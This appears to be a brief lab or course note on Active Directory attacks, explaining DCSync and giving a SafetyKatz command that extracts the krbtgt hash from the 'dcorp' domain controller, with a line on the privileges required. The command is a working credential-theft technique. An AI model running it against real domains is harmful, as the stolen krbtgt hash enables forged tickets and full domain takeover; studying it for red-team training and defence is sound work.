

*  To extract credentials from the DC without code execution on it, we can use DCSync.
*  To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for dcorp domain:
```
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

*  By default, Domain Admins, Enterprise Admins or Domain Controller
privileges are required to run DCSync.